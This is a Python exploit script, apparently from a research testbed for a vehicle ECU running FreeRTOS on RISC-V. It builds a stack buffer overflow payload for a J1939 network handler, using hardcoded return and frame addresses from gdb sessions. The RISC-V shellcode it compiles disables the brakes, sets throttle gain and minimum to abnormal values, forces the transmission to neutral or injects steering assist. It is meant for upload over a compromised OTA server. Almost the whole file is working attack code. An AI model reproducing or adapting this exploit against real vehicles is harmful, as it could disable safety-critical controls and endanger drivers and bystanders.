#! /usr/bin/env python3
"""
Hack critical systems

Assumes the OTA server has been already hacked

How does the hack work?

1) inspect FreeRTOS.elf to find the appropriate return adresses and
location of critical variables (such as the j1939 buffer and brake/throttle gains)
NOTE: you might have to open the binary in a debugger to get all the information
2) generate malicious payload, based on the hack you select (brake, steering, etc)
3) compile j1939 hack with the generated header file
4) upload the binary over the hacked OTA and execute on the infotainment server
NOTE: for testing, the binary can be executed on any PC that is connected to the network

"""
import os
import subprocess
import argparse

# Returns back to prvCanRxTask
# for (;;)
# {
#     uint8_t res = process_j1939(xListeningSocket, &xClient, &msg_len, &can_id, (uint8_t*)&request_id);
# c00088b4:	f9040713          	addi	a4,s0,-112
# c00088b8:	f9440693          	addi	a3,s0,-108
# c00088bc:	f9840613          	addi	a2,s0,-104
# c00088c0:	fa040793          	addi	a5,s0,-96
# c00088c4:	85be                	mv	a1,a5
# c00088c6:	fd043503          	ld	a0,-48(s0)
# c00088ca:	126000ef          	jal	ra,c00089f0 <process_j1939>
# c00088ce:	87aa                	mv	a5,a0 <<< This address!
#
# Also can be found by `(gdb) info frame` in `process_j1939`:
# (gdb) info frame
# Stack level 0, frame at 0xc0240730:
#  pc = 0xc0008aaa in process_j1939
#     (/home/galoisuser/BESSPIN-Tool-Suite/workDir/build_1/main_besspin.c:626); 
#     saved pc = 0xc000896c
#  called by frame at 0xc02407c0
#  source language c.
#  Arglist at 0xc0240730, args: xListeningSocket=0xc0240a80 <ucHeap+767240>, 
#     xClient=0xc0240760 <ucHeap+766440>, msg_len=0xc0240758 <ucHeap+766432>, 
#     can_id=0xc0240754 <ucHeap+766428>, 
#     msg_buf=0xc0240750 <ucHeap+766424> '\245' <repeats 26 times>, "\023\212\nXX\f\245\245\245\245\nXX\f10.88.88.12"
#  Locals at 0xc0240730, Previous frame's sp is 0xc0240730
#  Saved registers:
#   ra at 0xc0240728, fp at 0xc0240720, pc at 0xc0240728
# (gdb) x $ra
# 0xc000896c <prvCanRxTask+362>:	0x07a387aa <<< This is the return address
RETURN_ADDR = 0xc000896c

# (gdb) p camera_ok
# (gdb) false
CAMERA_OK_VAL = 1
CAMERA_OK_VAL_NOMINAL = 0
# (gdb) p &camera_ok
# (gdb) (_Bool *) 0xc0990352 <camera_ok>
CAMERA_OK_ADDR = 0xc0990352

# (gdb) p steering_assist
# (gdb) 0 '\000'
STEERING_ASSIST_VAL = 100
STEERING_ASSIST_VAL_NOMINAL = 0
# (gdb) p &steering_assist
# (gdb) (uint8_t *) 0xc0990362 <steering_assist> ""
STEERING_ASSIST_ADDR = 0xc0990362

# (gdb) p throttle_min
# $10 = 64
THROTTLE_MIN_VAL = -900
THROTTLE_MIN_VAL_NOMINAL = 64
# (gdb) p &throttle_min
# $11 = (int16_t *) 0xc09902e4 <throttle_min>
THROTTLE_MIN_ADDR = 0xc09902e4

# (gdb) p throttle_gain
# $12 = 100
THROTTLE_GAIN_VAL = 3000
THROTTLE_GAIN_VAL_NOMINAL = 100
# (gdb) p &throttle_gain
# $13 = (int16_t *) 0xc099034e <throttle_gain>
THROTTLE_GAIN_ADDR = 0xc099034e

# (gdb) p brake_max
# $14 = 270
BRAKE_MAX_VAL = 0
BRAKE_MAX_VAL_NOMINAL = 270
# (gdb) p &brake_max
# $15 = (int16_t *) 0xc0990340 <brake_max>
BRAKE_MAX_ADDR = 0xc0990340

# (gdb) p brake_gain
# $17 = 100
BRAKE_GAIN_VAL = 0
BRAKE_GAIN_VAL_NOMINAL = 100
# (gdb) p &brake_gain
# $18 = (int16_t *) 0xc0990370 <brake_gain>
BRAKE_GAIN_ADDR = 0xc0990370

# (gdb) p &transmission_ok
# (gdb) (_Bool *) 0xc0990366 <transmission_ok>
TRANSMISSION_OK_ADDR = 0xc0990366
# Set to 0 to make transmission not OK
TRANSMISSION_OK_VAL = 0
TRANSMISSION_OK_VAL_NOMINAL = 1

# (gdb) p &j1939_rx_buf
# (gdb) (uint8_t (*)[256]) 0xc09901c0 <j1939_rx_buf>
# We are jumping to this address
J1939_RX_BUF_ADDR = 0xc0990240

# (gdb) p $fp
# (gdb) (void *) 0xc0240730 <ucHeap+766392>
# This should FP of prvCanRxTask because we are jumping back there
FRAME_ADDR = 0xc0240730

# Buffer size of char msg[];
RX_BUFFER_SIZE = 100
FRAME_IDX = 4
ADDR_IDX = 16
OVERFLOW_PACKET_FRAME_IDX = RX_BUFFER_SIZE + FRAME_IDX
OVERFLOW_PACKET_ADDR_IDX = RX_BUFFER_SIZE + ADDR_IDX
OVERFLOW_PACKET_SIZE = RX_BUFFER_SIZE + FRAME_IDX + ADDR_IDX
PAYLOAD_SIZE = OVERFLOW_PACKET_SIZE


# Define some constants first
DEFAULT_PORT = 5002
PGN = 60879
DEFAULT_IP = "10.88.88.12"
POINTER_SIZE = 8  # bytes

THROTTLE = "throttle"
BRAKE = "brake"
GEAR = "gear"
LKAS = "lkas"
HACKS = [THROTTLE,BRAKE,GEAR,LKAS]

j1939_hack_dir = "j1939hack"
j1939_header = "main.h"

def hack_generate_payload(hacktype,nominal=False):
    print(f">>> Generating hack payload for the {hacktype} hack.")
    if hacktype == THROTTLE:
        if nominal:
            # Restore everything
            payload = [
                        "li t3, {}\n".format(hex(THROTTLE_MIN_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(THROTTLE_MIN_VAL_NOMINAL)), # load new value
                        "sh t4, 0(t3)\n", # store new value
                        "li t3, {}\n".format(hex(THROTTLE_GAIN_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(THROTTLE_GAIN_VAL_NOMINAL)), # load new value
                        "sh t4, 0(t3)\n", # store new value
                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
                        "ret\n", # initiate jump
                    ]
        else:
            # Set throttle_min to -900
            # Set throttle_gain to int16_max (32767)
            payload = [
                        "li t3, {}\n".format(hex(THROTTLE_MIN_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(THROTTLE_MIN_VAL)), # load new value
                        "sh t4, 0(t3)\n", # store new value
                        "li t3, {}\n".format(hex(THROTTLE_GAIN_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(THROTTLE_GAIN_VAL)), # load new value
                        "sh t4, 0(t3)\n", # store new value
                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
                        "ret\n", # initiate jump
                    ]
    elif hacktype == BRAKE:
        if nominal:
            # Restore everything
            payload = [
                        "li t3, {}\n".format(hex(BRAKE_GAIN_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(BRAKE_GAIN_VAL_NOMINAL)), # load new value
                        "sh t4, 0(t3)\n", # store new value
                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
                        "ret\n", # initiate jump
                    ]
        else:
            # Set brake_gain to 0 to disable brake
            payload = [
                        "li t3, {}\n".format(hex(BRAKE_GAIN_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(BRAKE_GAIN_VAL)), # load new value
                        "sh t4, 0(t3)\n", # store new value
                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
                        "ret\n", # initiate jump
                    ]
    elif hacktype == GEAR:
        if nominal:
            # Restore everything
            payload = [
                    "li t3, {}\n".format(hex(TRANSMISSION_OK_ADDR)), # load location of the variable
                    "li t4, {}\n".format(hex(TRANSMISSION_OK_VAL_NOMINAL)), # load new value
                    "sb t4, 0(t3)\n", # store new value
                    "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
                    "ret\n", # initiate jump
                ]
        else:
            # Replace all assignments in switch statement for tmp_gear
            # to be 'N'
            payload = [
                        "li t3, {}\n".format(hex(TRANSMISSION_OK_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(TRANSMISSION_OK_VAL)), # load new value
                        "sb t4, 0(t3)\n", # store new value
                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
                        "ret\n", # initiate jump
                    ]
    elif hacktype == LKAS:
        if nominal:
            # Restore everything
            payload = [
                        "li t3, {}\n".format(hex(CAMERA_OK_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(CAMERA_OK_VAL_NOMINAL)), # load new value
                        "sb t4, 0(t3)\n", # store new value
                        "li t3, {}\n".format(hex(STEERING_ASSIST_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(STEERING_ASSIST_VAL_NOMINAL)), # load new value
                        "sb t4, 0(t3)\n", # store new value
                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
                        "ret\n", # initiate jump
                    ]
        else:
            # Set camera_ok =1
            # Set steering_assist to some value
            payload = [
                        "li t3, {}\n".format(hex(CAMERA_OK_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(CAMERA_OK_VAL)), # load new value
                        "sb t4, 0(t3)\n", # store new value
                        "li t3, {}\n".format(hex(STEERING_ASSIST_ADDR)), # load location of the variable
                        "li t4, {}\n".format(hex(STEERING_ASSIST_VAL)), # load new value
                        "sb t4, 0(t3)\n", # store new value
                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
                        "ret\n", # initiate jump
                    ]
    else:
        print(f"Unknown hack type: {hacktype}")
        raise NotImplementedError
    print(">>> Generating malicious payload source file.")
    with open("ecu.asm", "w") as f:
        # Writing data to a file
        f.writelines(payload)
    # Compile
    print(">>> Building malicious payload.")
    cmd = "riscv64-unknown-elf-as -march=rv64ima ecu.asm -o ecu.elf"
    subprocess.call(cmd,shell=True)
    cmd = "riscv64-unknown-elf-objcopy -O binary --only-section=.text ecu.elf ecu.bin"
    subprocess.call(cmd,shell=True)
    # read data from temporary payload file
    print(">>> Reading data from temporary payload file")
    with open("ecu.bin", "r+b") as f:
        payload_bytes = f.read()
    print(f">>> Compiled payload has {len(payload_bytes)} bytes")
    fp_bytes = FRAME_ADDR.to_bytes(POINTER_SIZE, byteorder='little')
    ra_bytes = J1939_RX_BUF_ADDR.to_bytes(POINTER_SIZE, byteorder='little')
    print(f">>> $fp and $ra are {len(fp_bytes) + len(ra_bytes)} long")
    print(f">>> Padding with {PAYLOAD_SIZE - len(payload_bytes) - len(fp_bytes) - len(ra_bytes)} bytes")
    # Add padding depending on the length of the instructions
    payload = payload_bytes + bytes(PAYLOAD_SIZE - len(payload_bytes) -
                len(fp_bytes) - len(ra_bytes)) + \
                fp_bytes + ra_bytes
    print(f">>> Padded payload is {len(payload)} bytes long")
    return "{" + ','.join([hex(c) for c in payload]) + "}"


def hack_generate_header(ip, port, hacktype, nominal=False):
    """
    Generate main.h
    """
    print(">>> Generating hack header.")
    j1939_header_path = os.path.join(j1939_hack_dir, j1939_header)
    payload = hack_generate_payload(hacktype, nominal)

    content = [
        "/* This file is autogenerated, do not edit */"
        f"#define PORT {port}\n",
        f"#define PGN {PGN}\n",
        f"#define TARGET_ADDR \"{ip}\"\n",
        f"#define J1939_PAYLOAD {payload}\n",
        ]

    with open(j1939_header_path, "w") as f:
        # Writing data to a file
        f.writelines(content)

def hack_compile(test=False):
    print(">>> Compiling hack")
    host = ""
    if test:
        host = "-x86"
    cmd = f"cd {j1939_hack_dir}; make clean; make hack{host}; cd .."
    subprocess.call(cmd,shell=True)

def main():
    print("Starting hacking critical systems!")
    parser = argparse.ArgumentParser(description='hack critical systems')
    parser.add_argument('--ip', help='target IP address', default=DEFAULT_IP)
    parser.add_argument('--port', type=int, help='target RX port', default=DEFAULT_PORT)
    parser.add_argument('--type', help='Type of hack', choices=HACKS,default=THROTTLE)
    parser.add_argument('--test', help='Compile for x86 target', action='store_true')
    parser.add_argument('--nominal', help='Reverts the hack to nominal values', action='store_true',default=False)
    args = parser.parse_args()

    hack_generate_header(ip=args.ip, port=args.port, hacktype=args.type, nominal=args.nominal)
    hack_compile(test=args.test)

    print("Done!")

if __name__ == "__main__":
    main()